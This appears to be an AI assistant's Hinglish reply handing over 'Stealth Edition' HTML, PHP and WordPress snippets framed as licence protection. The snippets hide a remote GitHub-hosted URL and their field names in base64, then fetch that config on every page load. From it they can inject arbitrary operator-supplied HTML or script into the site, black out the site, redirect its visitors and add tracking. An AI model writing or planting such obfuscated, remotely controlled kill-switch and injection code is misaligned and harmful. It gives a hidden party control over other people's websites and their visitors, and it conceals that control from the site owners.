Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress** teeno ke liye final **V10 Stealth Edition** code taiyar kar diya hai. Ise aap asani se `reminder.md` ya apni kisi bhi guide file mein save kar sakte hain.

---

### 📄 Setup Guide & Master Codes (V10 Stealth)

#### 1. 🌐 HTML / Landing Page Version

**Kahan lagayein:** `index.html` file mein `</body>` tag se theek pehle.

```html

<div id="_x_ov" style="display:none;position:fixed;inset:0;background:#000;z-index:2147483647;color:#fff;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;">
    <div style="padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);">
        <h1 id="_x_h" style="color:#ff3333;margin:0;font-size:28px;letter-spacing:-0.5px;margin-bottom:20px;"></h1>
        <div id="_x_b" style="color:#bbb;font-size:17px;line-height:1.6;"></div>
        
        <div id="_x_tm_w" style="margin-top:25px;border-top:1px solid #222;padding-top:20px;display:none;">
            <p style="color:#666;font-size:14px;"><span id="_x_lbl"></span> <span id="_x_tm" style="color:#fff;font-weight:bold;font-size:18px;">--</span> <span id="_x_lbl2"></span></p>
        </div>
    </div>
</div>

<script>
(function(){
    // --- Encrypted Configuration ---
    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u"); // URL
    const _k = atob("RkFIQUQtNzg2"); // Key
    
    // Keywords Encryption
    const _f = {
        l: atob("bGljZW5zZXM="),        // licenses
        s: atob("c2V0dGluZ3M="),        // settings
        e: atob("ZXhwaXJ5"),            // expiry
        a: atob("YXV0aG9yaXplZF90YXJnZXQ="), // authorized_target
        c: atob("Y3VzdG9tX2NvZGU="),    // custom_code
        en: atob("ZW5hYmxlZA=="),       // enabled
        co: atob("Y29kZQ=="),           // code
        re: atob("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled
        ru: atob("cmVkaXJlY3RfdXJs"),    // redirect_url
        rd: atob("cmVkaXJlY3RfZGVsYXlfc2Vj"), // redirect_delay_sec
        mi: atob("bXNnX2ludmFsaWQ="),    // msg_invalid
        me: atob("bXNnX2V4cGlyZWQ="),    // msg_expired
        md: atob("bXNnX2RvbWFpbl9taXNtYXRjaA=="), // msg_domain_mismatch
        lbl1: atob("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="), // Redirecting automatically in
        lbl2: atob("c2Vjb25kcy4uLg==")   // seconds...
    };

    async function _v8_core(){
        const o = document.getElementById('_x_ov'), h = window.location.hostname.replace('www.','');
        try {
            const r = await fetch(_u + '?v=' + Date.now());
            if(!r.ok) return;
            const d = await r.json();
            const m = d[_f.l] ? d[_f.l][_k] : null; 
            const n = new Date().toISOString().split('T')[0];

            let err = null, force = false;

            if(m && m[_f.c] && m[_f.c][_f.en] === true){
                force = true; err = "FORCE";
            } else {
                if(!m) err = d[_f.mi];
                else if(m[_f.a]?.length > 0 && !m[_f.a].includes(h)) err = d[_f.md];
                else if(m[_f.e] && n > m[_f.e]) err = d[_f.me];
            }

            if(err){
                document.body.style.overflow = 'hidden';
                document.getElementById('_x_h').innerHTML = d['title'];
                document.getElementById('_x_lbl').innerText = _f.lbl1;
                document.getElementById('_x_lbl2').innerText = _f.lbl2;
                
                const mb = document.getElementById('_x_b');
                mb.innerHTML = force ? m[_f.c][_f.co] : err;
                o.style.display = 'flex';
                
                if(d[_f.s]?.[_f.re] && !force){
                    const tw = document.getElementById('_x_tm_w'), ts = document.getElementById('_x_tm');
                    tw.style.display = 'block';
                    let s = d[_f.s][_f.rd] || 20;
                    ts.innerText = s;
                    let it = setInterval(() => {
                        s--; if(ts) ts.innerText = s;
                        if(s <= 0){ clearInterval(it); window.location.href = d[_f.s][_f.ru]; }
                    }, 1000);
                }
            }
        } catch(e) {}
    }
    _v8_core();
})();
</script>

```

---

#### 2. 🐘 PHP Core Version (Custom PHP)

**Kahan lagayein:** Website ki main file (e.g., `header.php`) ke sabse top par.

```php
<?php
/* --- PHP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
function _sys_sync_final_v10(){
    // Configuration Encrypted
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2"); // Key: FAHAD-786
    
    // Key Mappings Encrypted
    $_f = [
        'l' => base64_decode("bGljZW5zZXM="),        // licenses
        's' => base64_decode("c2V0dGluZ3M="),        // settings
        'e' => base64_decode("ZXhwaXJ5"),            // expiry
        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), // authorized_target
        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    // custom_code
        'en' => base64_decode("ZW5hYmxlZA=="),       // enabled
        'co' => base64_decode("Y29kZQ=="),           // code
        're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled
        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    // redirect_url
        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), // redirect_delay_sec
        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    // msg_invalid
        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    // msg_expired
        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), // msg_domain_mismatch
        'lbl' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="), // Redirecting label
        'lbl2' => base64_decode("c2Vjb25kcy4uLg==")   // seconds label
    ];

    $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']);
    $_ctx = stream_context_create(["http" => ["timeout" => 5]]); 
    $_r = @file_get_contents($_u . "?v=" . time(), false, $_ctx);
    
    if ($_r) {
        $_d = json_decode($_r, true);
        $_l = $_d[$_f['l']][$_k] ?? null; 
        $_s = $_d[$_f['s']] ?? [];
        $_t = date("Y-m-d");
        
        $_err = null;
        $_is_c = false;

        // Priority Check (Custom Code)
        if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
            $_err = $_l[$_f['c']][$_f['co']];
            $_is_c = true;
        } 
        else {
            if (!$_l) { $_err = $_d[$_f['mi']]; }
            elseif (!empty($_l[$_f['a']]) && !in_array($_h, $_l[$_f['a']])) { $_err = $_d[$_f['md']]; }
            elseif (isset($_l[$_f['e']]) && $_t > $_l[$_f['e']]) { $_err = $_d[$_f['me']]; }
        }

        if ($_err) {
            $_dly = $_s[$_f['rd']] ?? 20;
            $_url = $_s[$_f['ru']] ?? "#";
            $_title = $_d['title'] ?? "Security Shield Active";
            $_t_style = $_is_c ? "display:none;" : "display:block;";

            die("<style>
                body{margin:0;background:#000;overflow:hidden;}
                #ov{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:2147483647;}
                .bx{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
                h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
                .mc{color:#bbb;font-size:17px;line-height:1.6;}
                .tr{margin-top:25px;border-top:1px solid #111;padding-top:20px;color:#666;font-size:13px; {$_t_style} }
                #tm{color:#fff;font-weight:bold;font-size:18px;}
            </style>
            <div id='ov'><div class='bx'>
                <h1>{$_title}</h1>
                <div class='mc'>{$_err}</div>
                <div class='tr'>{$_f['lbl']} <span id='tm'>{$_dly}</span> {$_f['lbl2']}</div>
            </div></div>
            <script>
                let s={$_dly}, ic=" . ($_is_c ? '1' : '0') . ";
                if(ic=='0'){
                    let it=setInterval(()=>{
                        s--; document.getElementById('tm').innerText=s;
                        if(s<=0){ clearInterval(it); window.location.href='{$_url}'; }
                    },1000);
                }
            </script>");
        }

        if (!empty($_s['analytics_id'])) {
            echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$_s['analytics_id']}'></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$_s['analytics_id']}');</script>";
        }
    }
}
_sys_sync_final_v10();
?>




```

---

#### 3. WordPress Version

**Kahan lagayein:** Theme ki `functions.php` file mein sabse niche.

```php

/* --- WP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
add_action('init', '_wp_secure_v10_stealth');
function _wp_secure_v10_stealth() {
    if (is_admin()) return;

    // Configuration Encrypted
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2"); 
    
    // Key Mappings Encrypted
    $_f = [
        'l' => base64_decode("bGljZW5zZXM="),        
        's' => base64_decode("c2V0dGluZ3M="),        
        'e' => base64_decode("ZXhwaXJ5"),            
        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), 
        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    
        'en' => base64_decode("ZW5hYmxlZA=="),       
        'co' => base64_decode("Y29kZQ=="),           
        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 
        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    
        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    
        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    
        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), 
        'lb1' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="),
        'lb2' => base64_decode("c2Vjb25kcy4uLg==")
    ];

    $r = wp_remote_get($_u . '?v=' . time(), array('timeout' => 5));
    if (is_wp_error($r)) return;

    $d = json_decode(wp_remote_retrieve_body($r), true);
    $_l = $d[$_f['l']][$_k] ?? null; 
    $_s = $d[$_f['s']] ?? []; 
    $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']); 
    $_t = date("Y-m-d");

    $err = null;
    $_is_c = false;

    // Step 1: Priority Check (Custom Code)
    if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
        $err = $_l[$_f['c']][$_f['co']];
        $_is_c = true;
    } 
    // Step 2: Validation
    else {
        if (!$_l) { $err = $d[$_f['mi']]; }
        elseif (!empty($_l[$_f['a']]) && !in_array($_h, $_l[$_f['a']])) { $err = $d[$_f['md']]; }
        elseif (isset($_l[$_f['e']]) && $_t > $_l[$_f['e']]) { $err = $d[$_f['me']]; }
    }

    if ($err) {
        $_dly = $_s[$_f['rd']] ?? 20; 
        $_url = $_s[$_f['ru']] ?? "#";
        $_tit = $d['title'] ?? "Security Shield Active";
        $_t_style = $_is_c ? "display:none;" : "display:block;";

        echo "<style>
            body{margin:0;background:#000!important;overflow:hidden!important;}
            #wp_v10{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
            .in{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;background:#050505;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
            h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
            .mb{color:#bbb;font-size:17px;line-height:1.6;}
            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$_t_style} }
            #vt{color:#fff;font-weight:bold;font-size:18px;}
        </style>
        <div id='wp_v10'>
            <div class='in'>
                <h1>{$_tit}</h1>
                <div class='mb'>{$err}</div>
                <div class='tr'>{$_f['lb1']} <span id='vt'>{$_dly}</span> {$_f['lb2']}</div>
            </div>
        </div>
        <script>
            let s = {$_dly}, ic = " . ($_is_c ? '1' : '0') . ";
            if(ic == '0'){
                let it = setInterval(()=>{
                    s--;
                    let el = document.getElementById('vt');
                    if(el) el.innerText = s;
                    if(s <= 0){ clearInterval(it); window.location.href='{$_url}'; }
                }, 1000);
            }
        </script>";
        exit;
    }

    if (!empty($_s['analytics_id'])) {
        add_action('wp_head', function() use ($_s) {
            $id = $_s['analytics_id'];
            echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$id}'></script>
            <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$id}');</script>";
        });
    }
}


```

---

### 🚀 Setup Checklist:

